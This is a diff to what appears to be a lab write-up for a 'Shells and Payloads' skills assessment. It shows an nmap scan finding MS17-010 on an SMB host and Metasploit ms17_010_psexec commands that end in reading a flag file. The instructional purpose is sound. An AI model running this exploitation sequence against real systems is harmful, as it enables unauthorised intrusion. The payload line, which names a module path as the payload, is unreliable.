@@ -354,16 +354,56 @@ We've got an smb server running an outdated version:
 
       445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
 
+- An nmap scan reveals that its got a high risk vulnerablity to CVE-2017-0143.
 
-- This is vulnerable to CVE 
+      nmap 172.16.1.13 -p 139,445 --script=vuln
+      Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-24 21:43 EDT
+      Pre-scan script results:
+      | broadcast-avahi-dos: 
+      |   Discovered hosts:
+      |     224.0.0.251
+      |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+      |_  Hosts are all up (not vulnerable).
+      Nmap scan report for 172.16.1.13
+      Host is up (0.00069s latency).
+      
+      PORT    STATE SERVICE
+      139/tcp open  netbios-ssn
+      445/tcp open  microsoft-ds
+      MAC Address: A2:DE:AD:FA:82:BA (Unknown)
+      
+      Host script results:
+      | smb-vuln-ms17-010: 
+      |   VULNERABLE:
+      |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+      |     State: VULNERABLE
+      |     IDs:  CVE:CVE-2017-0143
+      |     Risk factor: HIGH
+      |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+      |        servers (ms17-010).
+      |           
+      |     Disclosure date: 2017-03-14
+      |     References:
+      |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+      |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+      |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
 
 ## Exploit:
 
-Startup msfconsole and set the RHOSTS:
+Startup msfconsole and search for a sutable exploit. 
+
+      grep ms17-010 search exploit
+
+- Lets use: ms17_010_psexec
+
+      use exploit/windows/smb/ms17_010_psexec
+
+- Next we need to configure the script:
 
       set RHOSTS 172.16.1.13
 
-- The standard payload dosent get us a shell, so lets try a different payload and see what happens:
+If we run this, we'll see that the standard payload dosent get us a shell, so lets try a different payload and see what happens:
 
       set PAYLOAD windows/smb/ms17_010_psexec
 
@@ -379,9 +419,8 @@ Now we can complete the module by getting the hostname:
 
       hostname
 
-And the flag:
+- And then the flag:
 
       cat C:\Users\Administrator\Desktop\Skills-flag.txt
 
 Congrats! You've just completed the Skills Assesment for Shells and Payloads!
-
